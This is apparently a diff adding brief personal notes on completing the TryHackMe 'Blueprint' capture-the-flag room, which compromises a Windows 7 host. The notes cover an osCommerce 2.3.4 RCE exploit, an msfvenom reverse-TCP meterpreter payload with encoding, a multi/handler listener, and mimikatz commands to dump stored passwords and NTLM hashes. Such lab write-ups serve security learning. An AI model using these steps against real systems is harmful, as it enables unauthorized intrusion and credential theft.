@@ -1,0 +1,57 @@
+https://tryhackme.com/room/blueprint Completed 18/10/22
+
+Summary: Hacking into windows 7 to get NTLM HASH
+
+
+This room start with scanning the port to find out available service then access the ip:http port to discover that it is running a vulnerable framework called oscommerce 2.3.4
+
+Using searchsploit oscommerce 2.3.4 
+
+To discover that there is a rce vulnerability 
+
+Then use metaspliot 
+
+Msfconsole
+Use 43774.py
+Options
+
+Set required options and run.
+
+A meterpreter shell will spawn
+
+Getuid
+Getpid
+
+To check who are we and what process we are on
+
+Next is to migrate our process into another process that is more stable, we can migrate to svpool
+
+
+
+To do this we need to 
+
+Generate a windows tcp reverse shell payload and upload it into the windows system using msfvenom then upload it using first shell we spawn
+
+Msfvenom -p windows/meterpreter/reverse_tcp a -x86 --encoder x86/shikata_ga_nai LHOST=same ip as first shell LPORT= same as first shell -f exe -o anyname.exe
+
+Then
+
+Use multi/handler
+Set payload to windows/meterpreter/reverse_tcp
+Set lhost
+Set lport
+
+Go back to first shell
+Upload anyname.exe
+Execute -f anyname.exe
+CTRL z to background task
+Session 2 to go back to multi/handler
+
+New shell should spawn in multi/handler
+Load mimikatz
+Use Help command if forget commands
+creds_all to obtain password stored in memory
+lsa_dump_sam to obtain user hash
+
+
+
